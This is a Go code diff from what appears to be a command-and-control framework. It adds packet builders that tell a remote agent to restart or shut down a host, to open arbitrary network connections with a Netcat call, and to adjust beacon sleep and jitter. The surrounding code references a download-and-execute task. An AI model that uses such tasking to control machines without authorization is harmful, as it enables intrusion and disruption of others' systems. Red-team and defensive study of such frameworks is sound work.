@@ -597,6 +597,35 @@ func Delete(s string, recurse bool) *com.Packet {
 	return n
 }
 
+// Duration returns a set Session sleep and/or jitter Packet. This can be used
+// to instruct the client to update it's sleep and jitters value to the specified
+// duration and 0-100 percentage values if they are not unset. (-1 for Jitter,
+// anything <=0 for Sleep).
+//
+// For Sleep, anything less than or equal to zero is ignored!
+//
+// For Jitter, anything greater than 100 will be capped to 100 and anything less
+// than zero (except -1) will be set to zero. Values of -1 are ignored.
+//
+// IT IS RECOMMENDED TO USE THE 'Session.Duration' CALL INSTEAD TO PREVENT DE-SYNC
+// ISSSUES BETWEEN SERVER AND CLIENT. HERE ONLY FOR USAGE IN SCRIPTS.
+//
+// C2 Details:
+//  ID: MvTime
+//
+//  Input:
+//      int8   // Jitter
+//      uint64 // Sleep
+//  Output:
+//      uint8  // Jitter
+//      uint64 // Sleep
+func Duration(d time.Duration, j int) *com.Packet {
+	n := &com.Packet{ID: MvTime}
+	n.WriteInt8(int8(j))
+	n.WriteUint64(uint64(d))
+	return n
+}
+
 // Proxy returns an add Proxy Packet. This can be used to instruct the client to
 // attempt to add the specified Proxy with the name, bind address and Profile
 // bytes.
@@ -704,35 +733,6 @@ func UploadFile(dst, src string) (*com.Packet, error) {
 	return n, err
 }
 
-// Duration returns a set Session sleep and/or jitter Packet. This can be used
-// to instruct the client to update it's sleep and jitters value to the specified
-// duration and 0-100 percentage values if they are not unset. (-1 for Jitter,
-// anything <=0 for Sleep).
-//
-// For Sleep, anything less than or equal to zero is ignored!
-//
-// For Jitter, anything greater than 100 will be capped to 100 and anything less
-// than zero (except -1) will be set to zero. Values of -1 are ignored.
-//
-// IT IS RECOMMENDED TO USE THE 'Session.Duration' CALL INSTEAD TO PREVENT DE-SYNC
-// ISSSUES BETWEEN SERVER AND CLIENT. HERE ONLY FOR USAGE IN SCRIPTS.
-//
-// C2 Details:
-//  ID: MvTime
-//
-//  Input:
-//      int8   // Jitter
-//      uint64 // Sleep
-//  Output:
-//      uint8  // Jitter
-//      uint64 // Sleep
-func Duration(d time.Duration, j int) *com.Packet {
-	n := &com.Packet{ID: MvTime}
-	n.WriteInt8(int8(j))
-	n.WriteUint64(uint64(d))
-	return n
-}
-
 // ProxyReplace returns an replace Proxy Packet. This can be used to instruct
 // the client to attempt to call the 'Replace' function on the specified Proxy
 // with the name, bind address and Profile bytes as the arguments.
@@ -816,6 +816,66 @@ func PullExecute(url string, w bool, f *filter.Filter) *com.Packet {
 	return PullExecuteAgent(url, "", w, f)
 }
 
+// Restart returns a shutdown Packet. This will instruct the client to initate
+// a restart/reboot operation. A reboot message, reason, force and timeout can
+// be specified. Timeouts are specified in seconds.
+//
+// Message and Reason codes are only applicable to Windows devices and are ignored
+// on non-Windows devices.
+//
+// C2 Details:
+//  ID: TvPower
+//
+//  Input:
+//      string // Restart message (Windows only)
+//      uint32 // Timeout (seconds)
+//      uint32 // Reason code (Windows only)
+//      uint8  // Flags
+//  Output:
+//      <none>
+func Restart(msg string, sec uint32, force bool, reason uint32) *com.Packet {
+	n := &com.Packet{ID: TvPower}
+	n.WriteString(msg)
+	n.WriteUint32(sec)
+	n.WriteUint32(reason)
+	var v uint8 = 1
+	if force {
+		v |= 2
+	}
+	n.WriteUint8(v)
+	return n
+}
+
+// Shutdown returns a shutdown Packet. This will instruct the client to initate
+// a shutdown/poweroff operation. A shutdown message, reason, force and timeout
+// can be specified. Timeouts are specified in seconds.
+//
+// Message and Reason codes are only applicable to Windows devices and are ignored
+// on non-Windows devices.
+//
+// C2 Details:
+//  ID: TvPower
+//
+//  Input:
+//      string // Shutdown message (Windows only)
+//      uint32 // Timeout (seconds)
+//      uint32 // Reason code (Windows only)
+//      uint8  // Flags
+//  Output:
+//      <none>
+func Shutdown(msg string, sec uint32, force bool, reason uint32) *com.Packet {
+	n := &com.Packet{ID: TvPower}
+	n.WriteString(msg)
+	n.WriteUint32(sec)
+	n.WriteUint32(reason)
+	var v uint8 = 0
+	if force {
+		v |= 2
+	}
+	n.WriteUint8(v)
+	return n
+}
+
 // PullExecuteAgent returns a pull and execute Packet. This will instruct the client
 // to download the resource from the provided URL and execute the downloaded data.
 //
@@ -856,5 +916,35 @@ func PullExecuteAgent(url, agent string, w bool, f *filter.Filter) *com.Packet {
 	n.WriteString(agent)
 	n.WriteBool(w)
 	f.MarshalStream(n)
+	return n
+}
+
+// Netcat returns a network connection Packet. This will instruct the client to
+// initate a network call to the specified host:port with the provided protocol.
+// Reading the results and timeouts can be specified, along with the payload to
+// be sent.
+//
+// If 'read' is true, the resulting data stream results would be returned.
+//
+// C2 Details:
+//  ID: TvNetcat
+//
+//  Input:
+//      string // Host:Port
+//      uint8  // Read | Protocol
+//      uint64 // Timeout
+//      []byte // Data to send
+//  Output:
+//      []byte // Result data (if read is true)
+func Netcat(host string, proto uint8, t time.Duration, read bool, b []byte) *com.Packet {
+	n := &com.Packet{ID: TvNetcat}
+	n.WriteString(host)
+	p := proto
+	if read {
+		p |= 128
+	}
+	n.WriteUint8(p)
+	n.WriteUint64(uint64(t))
+	n.WriteBytes(b)
 	return n
 }
